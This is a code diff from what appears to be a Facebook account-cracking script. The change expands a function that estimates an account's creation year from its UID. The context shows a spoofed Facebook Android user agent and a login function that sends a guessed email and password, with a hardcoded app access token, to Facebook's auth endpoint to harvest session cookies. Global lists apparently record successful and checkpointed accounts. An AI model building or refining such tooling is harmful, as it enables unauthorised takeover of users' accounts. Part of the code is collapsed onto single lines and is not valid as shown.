@@ -38,8 +38,25 @@ def best_redmi_ua():
         f"FBSV/{m['android']};FBOP/1;FBCA/arm64-v8a;]"
     )
 
-def get_year_from_uid(uid): uid = str(uid) if len(uid) == 15: if uid[:5] in ["10000", "10001", "10002"]: return "2008-2010" elif uid[:5] in ["10003", "10004", "10005"]: return "2011-2013" elif uid[:5] in ["10006", "10007"]: return "2014-2016" elif uid[:5] in ["10008", "10009"]: return "2017-2020" else: return "2021+" return "Unknown"
-
+def get_year_from_uid(uid):
+    uid = str(uid)
+    if len(uid) == 15:
+        if uid[:5] in ["10000", "10001", "10002"]:
+            return "2008-2010"
+        elif uid[:5] in ["10003", "10004", "10005"]:
+            return "2011-2013"
+        elif uid[:5] in ["10006", "10007"]:
+            return "2014-2016"
+        elif uid[:5] in ["10008", "10009"]:
+            return "2017-2020"
+        else:
+            return "2021+"
+    elif len(uid) == 14:
+        return "2007-2008"
+    elif len(uid) == 13:
+        return "2006-2007"
+    else:
+        return "Unknown"
 def login(uid, pw): global oks, cps try: session = requests.Session() headers = { 'User-Agent': best_redmi_ua(), 'Content-Type': 'application/x-www-form-urlencoded' } data = { 'email': uid, 'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'locale': 'en_US', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claims': '1' } res = session.post('https://api.facebook.com/auth/login', data=data, headers=headers).json()
 
 if 'access_token' in res:
